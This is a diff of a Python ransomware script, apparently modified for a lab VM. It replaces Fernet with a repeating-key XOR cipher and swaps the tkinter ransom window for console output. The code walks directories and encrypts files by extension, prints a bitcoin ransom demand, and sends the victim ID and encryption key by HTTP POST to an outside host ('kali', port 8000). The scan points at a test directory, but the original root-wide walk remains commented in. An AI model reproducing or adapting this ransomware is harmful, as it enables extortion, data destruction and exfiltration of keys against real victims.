@@ -1,24 +1,35 @@
 import os
-import platform 
-import ssl 
-import shutil 
-import time
-import requests
-import ctypes
+import shutil
+import http.client
 import subprocess
 from datetime import datetime
 from os import name, path
-from cryptography.fernet import Fernet
-import tkinter as tk
-from tkinter import *
 from random import randint
 
 
-digits = randint(1111,9999) 
-key = Fernet.generate_key()
+class Crypto:
+    def __init__(self, key):
+        self.key = key
 
-url = '192.168.64.3' # PUT THE URL YOU GOT FROM NGROK HERE
+    def encrypt(self, data):
+        encrypted = bytearray(len(data))
+        for i in range(len(data)):
+            encrypted[i] = self.key[i % len(self.key)] ^ data[i]
 
+        return bytes(encrypted)
+
+    def decrypt(self, data):
+        return self.encrypt(data)
+
+    @classmethod
+    def generate_key(cls, len_bytes=4):
+        return os.urandom(len_bytes)
+
+
+digits = randint(1111, 9999)
+key = Crypto.generate_key()
+
+url = 'kali'  # PUT THE URL YOU GOT FROM NGROK HERE
 
 
 class ransom0:
@@ -71,13 +82,13 @@ class ransom0:
     def FindFiles(self):
         f = open("logs/path.txt", "w")
         cnt = 0
-        for root, dirs, files in os.walk("/"):
-            #for root, dirs, files in os.walk("YOUR/TESTING/DIRECTORY"):
+        #for root, dirs, files in os.walk("/"):
+        for root, dirs, files in os.walk("/home/msfadmin/ransom-test-dir"):
             if any(s in root for s in self.EXCLUDE_DIRECTORY):
                 pass
             else:
                 for file in files:
-                     if file.endswith(self.EXTENSIONS):
+                    if file.endswith(self.EXTENSIONS):
                         TARGET = os.path.join(root, file)
                         f.write(TARGET+'\n')
                         print(root)
@@ -88,7 +99,7 @@ class ransom0:
         f.close()
 
     def Encrypt(self, filename):
-        f = Fernet(key)
+        f = Crypto(key)
         with open(filename, "rb") as file:
             file_data = file.read()
         encrypted_data = f.encrypt(file_data)
@@ -102,7 +113,10 @@ def SendData(decrypted):
 
     data = f'[{digits}, {key}, "{date}", "{decrypted}"]'
 
-    requests.post(url, data)
+    con = http.client.HTTPConnection(url, 8000)
+    con.request('POST', '', data)
+    con.getresponse()
+    con.close()
 
 ransom0 = ransom0()
 
@@ -139,95 +153,34 @@ PATH = os.getcwd()
 
 
 def DECRYPT_FILE():
-    root= tk.Tk()
-    width = root.winfo_screenwidth() # Get screen width
-    height = root.winfo_screenheight() # Get screen height
+    print('YOUR FILES HAVE BEEN ENCRYPTED')
+    print('YOUR IMPORTANT DOCUMENTS, DATAS, PHOTOS, VIDEOS HAVE BEEN ENCRYPTED WITH MILITARY GRADE ENCRYPTION AND A UNIQUE KEY.')
+    print('to decrypt them, send 50$ in bitcoin to BITCOIN_ADRESS, and them send proof of tranfer and your DIGITS to mail@mail.com')
+    print('YOUR DIGITS IS {}'.format(digits))
+    key = input("Your decryption key: ")
 
+    def decrypt(filename):
+        f = Crypto(key)
+        with open(filename, "rb") as file:
+            encrypted_data = file.read()
+        decrypted_data = f.decrypt(encrypted_data)
+        with open(filename, "wb") as file:
+            file.write(decrypted_data)
 
-    canvas1 = tk.Canvas(root, width = width, height = height, bg='black') # Main window
-    canvas1.pack()
-
-    label1 = tk.Label(root, text='YOUR FILES HAVE BEEN ENCRYPTED') # Title
-    label1.config(font=('helvetica', int(height/20)))
-    label1.config(background='black', foreground='red')
-    canvas1.create_window(int(width/2), int(height/15), window=label1)
-
-
-    #img = tk.PhotoImage(file="lock.ppm")
-    #img = img.subsample(2) 
-    #img = img.zoom(1)
-    #label = tk.Label(root, image=img)
-    #label.config(background='black', foreground='red')
-    #canvas1.create_window(width/2, height/4, window=label)
-
-
-    label1 = tk.Label(root, text='YOUR IMPORTANT DOCUMENTS, DATAS, PHOTOS, VIDEOS HAVE BEEN ENCRYPTED WITH MILITARY GRADE ENCRYPTION AND A UNIQUE KEY.') # Title
-    label1.config(font=('helvetica', int(height/50)))
-    label1.config(background='black', foreground='red')
-    canvas1.create_window(int(width/2), int(height/20)*8, window=label1)
-
-
-    label1 = tk.Label(root, text='to decrypt them, send 50$ in bitcoin to BITCOIN_ADRESS, and them send proof of tranfer and your DIGITS to mail@mail.com') # Title
-    label1.config(font=('helvetica', int(height/50)))
-    label1.config(background='black', foreground='red')
-    canvas1.create_window(int(width/2), int(height/20)*9, window=label1)
-
-    label1 = tk.Label(root, text='YOUR DIGITS IS {}'.format(digits))# Display digits
-    label1.config(font=('helvetica', int(height/50)))
-    label1.config(background='black', foreground='red')
-    canvas1.create_window(int(width/2), int(height/20)*10, window=label1)
-
-
-
-    label1 = tk.Label(root, text='KEY:') # Title
-    label1.config(font=('helvetica', int(height/50)))
-    label1.config(background='black', foreground='red')
-    canvas1.create_window(int(width/2), int(height/20)*11, window=label1)
-    entry1 = tk.Entry (root) 
-    canvas1.create_window(int(width/2), int(height/20)*12, window=entry1)
-
-
-    def DECRYPT_FILE():
-
-        def decrypt(filename):
-            key = entry1.get()
-            f = Fernet(key)
-            with open(filename, "rb") as file:
-                encrypted_data = file.read()
-            decrypted_data = f.decrypt(encrypted_data)
-            with open(filename, "wb") as file:
-                file.write(decrypted_data)
-
-
-        with open('logs/path.txt') as fp:
+    with open('logs/path.txt') as fp:
+        line = fp.readline()
+        while line:
+            filename = line.strip()
+            try:
+                decrypt(filename)
+            except PermissionError:
+                print("!Permission Denied")
             line = fp.readline()
-            while line:
-                filename = line.strip()
-                try:
-                    decrypt(filename)
-                except PermissionError:
-                    print("!Permission Denied")
-                line = fp.readline()
-        label1 = tk.Label(root, text='YOUR FILES HAVE BEEN DECRYPTED') # Title
-        label1.config(font=('helvetica', int(height/50)))
-        label1.config(background='black', foreground='red')
-        canvas1.create_window(int(width/2), int(height/20)*15, window=label1)
-        fp.close()
+
+        print('YOUR FILES HAVE BEEN DECRYPTED')
         shutil.rmtree(PATH+'/logs', ignore_errors=True)
 
-        canvas1.create_window(int(width/2), 340, window=label1)  
-
-
-    button1 = tk.Button(text='Decrypt', command=DECRYPT_FILE)
-    button1.config(background='red')
-    canvas1.create_window(int(width/2), int(height/20)*13, window=button1)
-
-    root.mainloop()
-
     SendData('true')
-
-
-
 
 
 if __name__ == '__main__':
